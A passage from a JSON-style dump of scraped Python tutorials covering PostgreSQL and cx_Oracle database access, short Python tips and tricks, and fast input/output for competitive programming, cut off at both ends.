VARCHAR(10),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0salary INT, dept INT)')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the commit function permanently\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# saves the changes made to the database\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the rollback() function can be used if\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# there are any undesirable changes and\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# it simply undoes the changes of the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# previous query\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# a function to insert data# into the emp tabledef insert_data(id = 1, name = '', salary = 1000, dept = 1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inserting values into the emp table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('INSERT INTO emp VALUES(%s, %s, %s, %s)',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(id, name, salary, dept))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as e:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error', e)\u00a0\u00a0\u00a0\u00a0# commiting the transaction.\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0\u00a0\u00a0\u00a0# a function to fetch the data\u00a0# from the tabledef fetch_data():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# select all the rows from emp\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('SELECT * FROM emp')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error !')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# store the result in data\u00a0\u00a0\u00a0\u00a0data = cur.fetchall()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# return the result\u00a0\u00a0\u00a0\u00a0return data\u00a0\u00a0# a function to print the datadef print_data(data):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Query result: ')\u00a0\u00a0\u00a0\u00a0print()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# iterating over all the\u00a0\u00a0\u00a0\u00a0\u00a0# rows in the table\u00a0\u00a0\u00a0\u00a0for row in data:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing the columns\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('id: ', row[0])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('name: ', row[1])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('salary: ', row[2])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('dept: ', row[3])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('----------------------------------')\u00a0\u00a0# function to delete the tabledef delete_table():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# delete the table\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('DROP TABLE emp')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as e:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('error', e)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0\u00a0\u00a0\u00a0# driver functionif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# create the table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0create_table()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# inserting some values\u00a0\u00a0\u00a0\u00a0insert_data(1, 'adith', 1000, 2)\u00a0\u00a0\u00a0\u00a0insert_data(2, 'tyrion', 100000, 2)\u00a0\u00a0\u00a0\u00a0insert_data(3, 'jon', 100, 3)\u00a0\u00a0\u00a0\u00a0insert_data(4, 'daenerys', 10000, 4)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# getting all the rows\u00a0\u00a0\u00a0\u00a0data = fetch_data()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# printing the rows\u00a0\u00a0\u00a0\u00a0print_data(data)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# deleting the table\u00a0\u00a0\u00a0\u00a0# once we are done with\u00a0\u00a0\u00a0\u00a0# the program\u00a0\u00a0\u00a0\u00a0delete_table()Output :My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b424b2f58ccbff174c3543de3a4d93bb",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Sometimes as part of programming, we required to work with the databases because we want to store a huge amount of information so we use databases, such as Oracle, MySQL, etc. So In this article, we will discuss the connectivity of Oracle database using Python. This can be done through the module name cx_Oracle.\u00a0Oracle Database\u00a0For communicating with any database through our Python program we require some connector which is nothing but the cx_Oracle module.For installing cx-Oracle :\u00a0If you are using Python >= 3.6 use the below command in Linux: \u2013pip install cx-OracleIf you are using Python >= 3.6 use the below command in Windows: \u2013py -m pip install cx-OracleBy this command, you can install cx-Oracle package but it is required to install Oracle database first on your PC.\u00a0Import database specific module\u00a0Ex. import cx_Oracleconnect(): Now Establish a connection between the Python program and Oracle database by using connect() function.\u00a0\u00a0con = cx_Oracle.connect('username/password@localhost')cursor(): To execute a SQL query and to provide results some special object is required that is nothing but cursor() object.\u00a0cursor = cx_Oracle.cursor()execute/executemany method :\u00a0cursor.execute(sqlquery) \u2013 \u2013 \u2013 -> to execute a single query.\u00a0cursor.executemany(sqlqueries) \u2013 \u2013 \u2013 -> to execute a single query with multiple bind variables/place holders.commit(): For DML(Data Manipulation Language) queries that comprise operations like update, insert, delete. We need to commit() then only the result reflects in the database.fetchone(), fetchmany(int), fetchall():fetchone() : This method is used to fetch one single row from the top of the result set.fetchmany(int): This method is used to fetch a limited number of rows based on the argument passed in it.fetchall() : This method is used to fetch all rows from the result set.close(): After all done it is mandatory to close all operations.\u00a0cursor.close()\ncon.close()Execution of SQL statement:\u00a01. Creation of tablePython3# importing moduleimport cx_Oracle\u00a0# Create a table in Oracle databasetry:\u00a0\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0\u00a0\u00a0\u00a0print(con.version)\u00a0\u00a0\u00a0\u00a0\u00a0# Now execute the sqlquery\u00a0\u00a0\u00a0\u00a0cursor = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0# Creating a table employee\u00a0\u00a0\u00a0\u00a0cursor.execute(\"create table employee(empid integer primary key, name varchar2(30), salary number(10, 2))\")\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Table Created successfully\")\u00a0except cx_Oracle.DatabaseError as e:\u00a0\u00a0\u00a0\u00a0print(\"There is a problem with Oracle\", e)\u00a0# by writing finally if any error occurs# then also we can close the all database operationfinally:\u00a0\u00a0\u00a0\u00a0if cursor:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cursor.close()\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:\u00a0Table Created successfullyDDL statements don\u2019t require to be committed. They are automatically committed. In the above program, I have used execute() method to execute an SQL statement.2. Inserting a record into table using execute() methodPython3# importing moduleimport cx_Oracle\u00a0# Inserting a record into a table in Oracle databasetry:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0\u00a0\u00a0\u00a0cursor = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0#con.autocommit = True\u00a0\u00a0\u00a0\u00a0# Inserting a record into table employee\u00a0\u00a0\u00a0\u00a0cursor.execute('insert into employee values(10001,\\'Rahul\\',50000.50)')\u00a0\u00a0\u00a0\u00a0\u00a0# commit() to make changes reflect in the database\u00a0\u00a0\u00a0\u00a0con.commit()\u00a0\u00a0\u00a0\u00a0print('Record inserted successfully')\u00a0except cx_Oracle.DatabaseError as e:\u00a0\u00a0\u00a0\u00a0print(\"There is a problem with Oracle\", e)\u00a0# by writing finally if any error occurs# then also we can close the all database operationfinally:\u00a0\u00a0\u00a0\u00a0if cursor:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cursor.close()\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:\u00a0Record inserted successfullyOnce we execute any DML statement it is required to commit the transaction. You can commit a transaction in 2 ways: \u2013con.commit(). This is used to commit a transaction manually.con.autocommit = True. This is used to commit a transaction automatically.3. Inserting multiple records into a table using executemany() methodPython3import cx_Oracle\u00a0# Load data from a csv file into Oracle table using executemanytry:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0print('There is an error in Oracle database:', er)\u00a0else:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data = [[10007, 'Vikram', 48000.0], [10008, 'Sunil', 65000.1], [10009, 'Sameer', 75000.0]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Inserting multiple records into employee table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# (:1,:2,:3) are place holders. They pick data from a list supplied as argument\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.executemany('insert into employee values(:1,:2,:3)', data)\u00a0\u00a0\u00a0\u00a0\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('There is an error in Oracle database:', er)\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(er)\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# To commit the transaction manually\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.commit()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Multiple records are inserted successfully')\u00a0finally:\u00a0\u00a0\u00a0\u00a0if cur:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.close()\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output: \u00a0Multiple records are inserted successfullyThere might be times when it is required to execute a SQL statement multiple times based on the different values supplied to it each time. This can be achieved using executemany() method. We supply a list containing a list of values that will replace placeholders in a SQL query to be executed.\u00a0From the above case:1 is substituted by value 10007:2 is substituted by value \u2018Vikram\u2019:3 is substituted by value 48000.0And so on(next list of values in a given list)Similarly, you can supply a list of dictionaries. But instead of placeholder, we will use the bind variable( discussed later).4. View result set from a select query using fetchall(), fetchmany(int), fetchone()Python3import cx_Oracle\u00a0try:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0print('There is an error in the Oracle database:', er)\u00a0else:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fetchall() is used to fetch all records from result set\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchall()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fetchmany(int) is used to fetch limited number of records from result set based on integer argument passed in it\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchmany(3)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fetchone() is used fetch one record from top of the result set\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchone()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('There is an error in the Oracle database:', er)\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Error:'+str(er))\u00a0\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if cur:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.close()\u00a0finally:\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:[(10001, 'Rahul', 50000.5), (10002, 'Sanoj', 40000.75), (10003, 'Soumik', 30000.25), (10004, 'Sayan', 45000.0), (10005, 'Sobhan', 60000.1), (10006, 'Gururaj', 70000.0), (10007, 'Vikram', 48000.0), (10008, 'Sunil', 65000.1), (10009, 'Sameer', 75000.0)]\n[(10001, 'Rahul', 50000.5), (10002, 'Sanoj', 40000.75), (10003, 'Soumik', 30000.25)]\n(10001, 'Rahul', 50000.5)In the above program, we have used 3 methods\u00a0fetchall() : The fetchall() is used to fetch all records from the result set.fetchmany(int) : The\u00a0fetchmany(int) is used to fetch the limited number of records from the result set based on the integer argument passed in it.fetchone() : The\u00a0fetchone() is used to fetch one record from the top of the result set.5. View result set from a select query using bind variablePython3import cx_Oracle\u00a0try:\u00a0\u00a0\u00a0\u00a0con = cx_Oracle.connect('tiger/scott@localhost:1521/xe')\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0print('There is error in the Oracle database:', er)\u00a0else:\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = con.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('select * from employee where salary > :sal', {'sal': 50000})\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0rows = cur.fetchall()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(rows)\u00a0\u00a0\u00a0\u00a0\u00a0except cx_Oracle.DatabaseError as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('There is error in the Oracle database:', er)\u00a0\u00a0\u00a0\u00a0\u00a0except Exception as er:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Error:', er)\u00a0\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if cur:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.close()\u00a0finally:\u00a0\u00a0\u00a0\u00a0if con:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0con.close()Output:[(10001, 'Rahul', 50000.5), (10005, 'Sobhan', 60000.1), (10006, 'Gururaj', 70000.0),\n (10008, 'Sunil', 65000.1), (10009, 'Sameer', 75000.0)]In this case, I have passed a dictionary in execute() method. This dictionary contains the name of the bind variable as a key, and it\u2019s corresponding value. When the SQL query is executed, value from the key is substituted in place of bind variable.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "75c7ca6f474f01f2d962a368c95cbbe4",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is one of the most preferred languages out there. Its brevity and high readability makes it so popular among all programmers.So here are few of the tips and tricks you can use to bring up your Python programming game.1. In-Place Swapping Of Two Numbers.x, y = 10, 20print(x, y)x, y = y, xprint(x, y)Output:\r\n10 20\r\n20 10\r\n2. Reversing a string in Pythona = \"GeeksForGeeks\"print(\"Reverse is\", a[::-1])Output:\r\nReverse is skeeGroFskeeG\r\n3. Create a single string from all the elements in lista = [\"Geeks\", \"For\", \"Geeks\"]print(\" \".join(a))Output:\r\nGeeks For Geeks\r\n4. Chaining Of Comparison Operators.n = 10result = 1 < n < 20print(result)result = 1 > n <= 9print(result)Output:\r\nTrue\r\nFalse\r\n4. Print The File Path Of Imported Modules.import osimport socket\u00a0\u00a0print(os)print(socket)Output:\r\n<module 'os' from '/usr/lib/python3.5/os.py'>\r\n<module 'socket' from '/usr/lib/python3.5/socket.py'>\r\n5. Use Of Enums In Python.class MyName:\u00a0\u00a0\u00a0\u00a0Geeks, For, Geeks = range(3)\u00a0\u00a0print(MyName.Geeks)print(MyName.For)print(MyName.Geeks)Output:\r\n2\r\n1\r\n2\r\n6. Return Multiple Values From Functions.def x():\u00a0\u00a0\u00a0\u00a0return 1, 2, 3, 4a, b, c, d = x()\u00a0\u00a0print(a, b, c, d)Output:\r\n1 2 3 4\r\n7. Find The Most Frequent Value In A List.test = [1, 2, 3, 4, 2, 2, 3, 1, 4, 4, 4]print(max(set(test), key = test.count))Output:\r\n4\r\n8. Check The Memory Usage Of An Object.import sysx = 1print(sys.getsizeof(x))Output:\r\n28\r\n9. Print string N times.n = 2a = \"GeeksforGeeks\"print(a * n)Output:\r\nGeeksforGeeksGeeksforGeeks\r\n10. Checking if two words are anagramsfrom collections import Counterdef is_anagram(str1, str2):\u00a0\u00a0\u00a0\u00a0\u00a0return Counter(str1) == Counter(str2)\u00a0\u00a0# or without having to import anything\u00a0def is_anagram(str1, str2):\u00a0\u00a0\u00a0\u00a0\u00a0return sorted(str1) == sorted(str2)\u00a0\u00a0\u00a0print(is_anagram('geek', 'eegk'))print(is_anagram('geek', 'peek'))\u00a0\u00a0\u00a0\u00a0Output:\r\nTrue\r\nFalse\r\nReferences:1.10 Neat Python Tricks Beginners Should Know2.30 Essential Python Tips And Tricks For ProgrammersMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a5bd9fb93cc1cf31165d869bb4c40cbf",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is indeed one of the smart and most trending languages. Here are some cool hacks that make python superb among all other languages.\u00a0List comprehensions: List comprehension is the best and efficient technique to get rid of writing unnecessary lines of code. Read Article to know more.\u00a0Printing a list: The list is not printed according to the user\u2019s requirement. They are always printed in unwanted square brackets and single quotes. But there is a trivial solution to print the list efficiently by using the string\u2019s join method.\u00a0The join method turns the list into a string by casting each item into a string and connecting them with the string that joins was called on.\u00a0Python# Declaring the list geekgeek = ['Geeks', 'Programming', 'Algorithm', 'Article']\u00a0\u00a0\u00a0# Directly printing the listprint (\"Simple List:\", geek)\u00a0\u00a0\u00a0# Printing the list by join methodprint ('List by using join method: %s' % ', ' .join(geek))\u00a0\u00a0\u00a0# Direct use of join methodprint ('Direct apply the join method:',(\", \" .join(geek)))Output: \nSimple List: ['Geeks', 'Programming', 'Algorithm', 'Article']\nList by using join method: Geeks, Programming, Algorithm, Article\nDirect apply the join method: Geeks, Programming, Algorithm, ArticleCool Zip tricksTranspose a matrix: You can Read Here about this.Partition a list into N groups: We used iter() as an iterator over a sequence.\u00a0Python3# Declaring the list geekgeek = ['Sun', 'Flowers', 'Peoples', 'Animals', 'Day', 'Night']\u00a0partition = list(zip (*[iter(geek)] * 2))print (partition)Output: \n[('Sun', 'Flowers'), ('Peoples', 'Animals'), ('Day', 'Night')]Explanation: [iter(geek)] * 2 produces a list containing 2 items of geek[] list, i.e. a list of length 2. *arg unpacks a sequence into arguments for a function call. Therefore we are passing the same iterator 2 times to zip().\u00a0Printing more than one list\u2019s items simultaneously\u00a0Pythonlist1 = [1, 3, 5, 7]list2 = [2, 4, 6, 8]\u00a0# Here zip() function takes two equal length list and merges them# together in pairsfor a, b in zip(list1,list2):\u00a0\u00a0\u00a0\u00a0print (a, b)Output: \n1 2\n3 4\n5 6\n7 8Take the string as input and convert it into the list:\u00a0Python3# Reads a string from input and type case them to int# after splitting to white-spaces\u00a0formatted_list = list(map(int, input().split()))print(formatted_list)Input:\n2 4 5 6\nOutput:\n[2, 4, 5, 6] Convert the list of list into a single list\u00a0Python3# import the itertoolsimport itertools\u00a0# Declaring the list geekgeek = [[1, 2], [3, 4], [5, 6]]\u00a0# chain.from_iterable() function returns the# elements of nested list# and iterate from first list# of iterable till the last# end of the list\u00a0lst = list(itertools.chain.from_iterable(geek))print(lst)Output: \n[1, 2, 3, 4, 5, 6]Printing the repeated characters: The task is to print the pattern like this Geeeeekkkkss. So we can easily print this pattern without using it for a loop.\u00a0Python# + used for string concatenation# To repeat the character n times, just multiply n\u00a0# with that character\u00a0\u00a0print (\"G\" + \"e\"*5 + \"k\"*4 + \"s\"*2)Output:\nGeeeeekkkkssRead More: 10 interesting facts about Python\u00a0Reference: https://www.quora.com/What-are-some-cool-Python-tricksThis article is contributed by Shubham Bansal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "442dfaeb54d917b6f9ba1be5aaa820a4",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python is an amazingly user-friendly language with the only flaw of being slow. In comparison to C, C++, and Java, it is quite slower. Online coding platforms, if C/C++ limit provided is X. Usually, in Java time provided is 2X and Python, it\u2019s 5X.To improve the speed of code execution for input/output intensive problems, languages have various input and output procedures.\u00a0An Example Problem :\u00a0Consider a question of finding the sum of N numbers inputted from the user.\u00a0Input a number N.\u00a0Input N numbers are separated by a single space in a line.\u00a0\u00a0Examples:\u00a0Input : \n5\n1 2 3 4 5\nOutput :\n15Different Python solutions for the above Problem :\u00a0Normal Method Python: (Python 2.7)\u00a01. raw_input() takes an optional prompt argument. It also strips the trailing newline character from the string it returns.\u00a02. print is just a thin wrapper that formats the inputs (space between args and newline at the end) and calls the write function of a given object.\u00a0\u00a0Python3# basic method of input output# input Nn = int(input())\u00a0# input the arrayarr = [int(x) for x in input().split()]\u00a0# initialize variablesummation = 0\u00a0# calculate sumfor x in arr:\u00a0\u00a0\u00a0\u00a0summation += x\u00a0\u00a0\u00a0\u00a0\u00a0# print answerprint(summation)A bit faster method using inbuilt stdin, stdout: (Python 2.7)\u00a01. sys.stdin on the other hand is a File Object. It is like creating any other file object one could create to read input from the file. In this case, the file will be a standard input buffer.\u00a02. stdout.write(\u2018D\\n\u2019) is faster than print \u2018D\u2019.\u00a03. Even faster is to write all once by stdout.write(\u201c\u201d.join(list-comprehension)) but this makes memory usage dependent on the size of the input.\u00a0\u00a0Python3# import inbuilt standard input outputfrom sys import stdin, stdout\u00a0# suppose a function called main() and# all the operations are performeddef main():\u00a0\u00a0\u00a0\u00a0\u00a0# input via readline method\u00a0\u00a0\u00a0\u00a0n = stdin.readline()\u00a0\u00a0\u00a0\u00a0\u00a0# array input similar method\u00a0\u00a0\u00a0\u00a0arr = [int(x) for x in stdin.readline().split()]\u00a0\u00a0\u00a0\u00a0\u00a0#initialize variable\u00a0\u00a0\u00a0\u00a0summation = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# calculate sum\u00a0\u00a0\u00a0\u00a0for x in arr:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0summation += x\u00a0\u00a0\u00a0\u00a0\u00a0# could use inbuilt summation = sum(arr)\u00a0\u00a0\u00a0\u00a0\u00a0# print answer via write\u00a0\u00a0\u00a0\u00a0# write method writes only\u00a0\u00a0\u00a0\u00a0# string operations\u00a0\u00a0\u00a0\u00a0# so we need to convert any\u00a0\u00a0\u00a0\u00a0# data into string for input\u00a0\u00a0\u00a0\u00a0stdout.write(str(summation))\u00a0# call the main methodif __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0main()\u00a0\u00a0\u00a0The difference in time:\u00a0\u00a0Timing summary (100k lines each)\u00a0\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2013\u00a0Print : 6.040 s\u00a0Write to file : 0.122 s\u00a0Print with Stdout : 0.121 sAs we have seen till now that taking input from the standard system and giving output to the standard system is always a good idea to improve the efficiency of the code which is always a need in Competitive programming. But wait! would you like to write these long lines every time when you need them? Then, what\u2019s the benefit of using Python.\u00a0Let\u2019s discuss the solution to this problem. What we can do is let\u2019s create separate functions for taking inputs of various types and just call them whenever you need them.\u00a0\u00a0When you want to take input of particular integers of integers given in a single lineSuppose the input is of the following form\u00a0\u00a05 7 19 20and we want separate variables to reference them. what we want is:\u00a0\u00a0a = 5\nb = 7\nc = 19\nd = 20so, we can create a function named as get_ints() as follows:\u00a0\u00a0Python3import sysdef get_ints(): return map(int, sys.stdin.readline().strip().split())\u00a0a,b,c,d = get_ints()Now you don\u2019t have to write this line again and again. You just have to call the get_ints() function in order to take input in this form. In the function get_ints we are using the map function.When you want to take input of list of integers given in a single lineSuppose the input is of the following form\u00a01 2 3 4 5 6 7 8and we want that a single variable will hold the whole list of integers. What we want is :\u00a0\u00a0Arr = [1, 2, 3, 4, 5, 6, 7, 8]So, here we will create a function named get_list() as follows:\u00a0\u00a0Python3import sysdef get_ints(): return list(map(int, sys.stdin.readline().strip().split()))\u00a0Arr = get_ints()Now you don\u2019t have to write this line again and again. You just have to call the get_ints() function in order to take input in this form\u00a0When you want to take input of stringSuppose the input is of the following form\u00a0\u00a0GeeksforGeeks is the best platform to practice Coding.and we want that a single reference variable will hold this string. What we want is :\u00a0\u00a0string = \"GeeksforGeeks if the best platform to practice coding.\"So, here we will create a function named get_string() as follows:\u00a0Python3import sysdef get_string(): return sys.stdin.readline().strip()\u00a0string = get_string()Now you don\u2019t have to write this line again and again. You just have to call the get_string() function in order to take input in this formAdding a buffered pipe io: (Python 2.7)\u00a01. Simply, adding the buffered IO code before your submission code to make the output faster.\u00a02. The benefit of io.BytesIO objects is that they implement a common interface (commonly known as a \u2018file-like\u2019 object). BytesIO objects have an internal pointer and for every call to read(n) the pointer advances.\u00a03. The atexit module provides a simple interface to register functions to be called when a program closes down normally. The sys module also provides a hook, sys.exitfunc, but only one function can be registered there. The atexit registry can be used by multiple modules and libraries simultaneously.\u00a0\u00a0Python3# template 